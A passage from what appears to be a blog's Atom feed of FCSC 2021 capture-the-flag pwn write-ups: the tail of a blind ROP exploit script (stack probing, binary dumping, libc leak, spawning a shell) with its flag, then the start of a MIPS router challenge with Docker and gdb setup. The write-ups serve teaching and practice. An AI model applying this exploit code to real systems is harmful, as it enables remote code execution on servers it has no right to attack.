    <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">jmp</span><span class="p">(</span><span class="n">av</span><span class="p">):</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">av</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">5.0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] sending: </span><span class="si">{</span><span class="n">padding</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;Hello you.</span><span class="se">\n</span><span class="s2">What is your name ?</span><span class="se">\n</span><span class="s2">&gt;&gt;&gt; Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address</span>

<span class="k">def</span> <span class="nf">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">leak1</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
                <span class="n">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">leak1</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="k">def</span> <span class="nf">leak2_opti</span><span class="p">(</span><span class="n">padding</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">continue</span>

    <span class="k">return</span> <span class="n">leak1</span>

<span class="k">def</span> <span class="nf">find_brop</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">):</span>
        <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">35</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_ - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">i</span>

<span class="k">def</span> <span class="nf">dump_binary</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">base</span><span class="p">):</span>
    <span class="n">gadget_leak</span> <span class="o">=</span> <span class="mh">0x400510</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> 
    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>

    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;leet_dump.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;ab&#34;</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x400fff</span><span class="p">:</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gadget_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
            <span class="k">continue</span>

        <span class="n">leak</span> <span class="o">=</span> <span class="n">resp1</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp1</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)]</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">):</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: 0x00&#34;</span><span class="p">)</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">buf</span> <span class="o">+=</span> <span class="n">leak</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">leak</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

            <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
        
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mh">0x100</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
            <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Buffering ..&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">find_plt</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="mh">0x400000</span> 
    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span> 

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">):</span>
        <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span> 

        <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp1</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

        <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span>

<span class="k">def</span> <span class="nf">try_jmp_flow</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
            <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
            <span class="k">break</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">resp</span><span class="p">,</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">flow</span><span class="p">(</span><span class="n">padding</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">av</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">FFLUSH_GOT</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">GADGET_LEAK</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span> <span class="o">+</span> <span class="mh">0x656</span><span class="p">)</span> <span class="c1"># ret2main</span>

    <span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">))</span>
    <span class="n">resp_tmp</span><span class="p">,</span> <span class="n">io</span> <span class="o">=</span> <span class="n">try_jmp_flow</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">)</span>
    <span class="n">leak_fflush</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">resp_tmp</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span><span class="n">resp_tmp</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;What is&#39;</span><span class="p">)],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>

    <span class="n">libc</span> <span class="o">=</span> <span class="n">leak_fflush</span> <span class="o">-</span> <span class="n">FFLUSH_OFFSET</span> 
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">av</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">OFFT_BINSH</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">SYSTEM</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="n">flow</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
<span class="c1"># FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}</span>
</code></pre></div><p>Thanks to the creator of this very interesting challenge !</p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/FCSC" term="FCSC" label="FCSC" />
                             
                                <category scheme="https://nasm.re/tags/Blind-Date" term="Blind-Date" label="Blind Date" />
                             
                                <category scheme="https://nasm.re/tags/n4sm" term="n4sm" label="n4sm" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[FCSC 2021 - pwn] Itsy Mipsy router]]></title>
            <link href="https://nasm.re/posts/mipsy/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/mipsy/</id>
            
            <published>2021-05-03T00:00:00+00:00</published>
            <updated>2021-05-03T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="itsy-mipsy-router-200-pts">
        Itsy Mipsy Router (200 pts)
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#itsy-mipsy-router-200-pts" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Itsy Mipsy Router (200 pts)" href="#itsy-mipsy-router-200-pts">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Itsy Mipsy Router is a pwn challenge I did during the <a
  class="gblog-markdown__link"
  href="https://www.france-cybersecurity-challenge.fr"
  
  >FCSC event</a
>.
It&rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !</p>
<div class="gblog-post__anchorwrap">
    <h2 id="setup">
        Setup
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#setup" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Setup" href="#setup">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>So basically we got this:</p>
<blockquote>
<p>On vous demander d&rsquo;auditer un routeur à l&rsquo;interface entre Internet et un réseau interne d&rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.
nc challenges2.france-cybersecurity-challenge.fr 4005</p>
</blockquote>
<p>And for debugging purposes administrators provided a Docker file:</p>
<pre tabindex="0"><code>FROM debian:buster-slim
RUN apt update
RUN apt install -yq socat qemu-user libc6-mips64-cross
RUN apt clean
RUN rm -rf /var/lib/apt/lists/

WORKDIR /app
COPY ./mipsy ./
RUN rm /etc/ld.so.cache

EXPOSE 4000
EXPOSE 1234
CMD socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&quot;
</code></pre><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
<pre tabindex="0"><code>$ uname -a
Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
$ sudo apt install socat qemu-user libc6-mips64-cross
Lecture des listes de paquets... Fait
Construction de l'arbre des dépendances       
Lecture des informations d'état... Fait
socat est déjà la version la plus récente (1.7.3.3-2).
libc6-mips64-cross est déjà la version la plus récente (2.30-0ubuntu2cross2).
qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
0 mis à jour, 0 nouvellement installés, 0 à enlever et 17 non mis à jour.
$ sudo rm -f /etc/ld.so.cache
$ socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&quot;
</code></pre><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
<pre tabindex="0"><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
Reading symbols from ./mipsy...
(No debugging symbols found in ./mipsy)
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg&gt; target remote localhost:5445

</code></pre><p>To send the payload  I used <a
  class="gblog-markdown__link"
  href="https://github.com/Gallopsled/pwntools"
  
  >pwntools</a
>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="c1"># return remote(&#34;challenges2.france-cybersecurity-challenge.fr&#34;, 4005)</span>
    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</code></pre></div><p>Now we launch the python script to trigger the socat:</p>
<pre tabindex="0"><code>$ python3 wu.py                                                               
[+] Opening connection to localhost on port 4000: Done
</code></pre><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
<pre tabindex="0"><code>Remote debugging using localhost:5445
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
0x00000040008038d0 in ?? ()
Could not check ASLR: Couldn't get personality
Downloading '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy' from the remote server: OK
add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
'context': Print out the current register, instruction, and stack context.
Exception occurred: context: unsupported operand type(s) for +: 'NoneType' and 'int' (&lt;class 'TypeError'&gt;)
For more info invoke `set exception-verbose on` and rerun the command
or debug it by yourself with `set exception-debugger on`
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       0x120000000        0x12002e000 r-xp    2e000 0      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x12003d000        0x120040000 r--p     3000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
       0x120040000        0x120043000 rw-p     3000 30000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
      0x4000403000       0x4000828000 r--p   425000 0      &lt;explored&gt;
      0x40007fe000       0x4000801000 rw-p     3000 0      [stack]

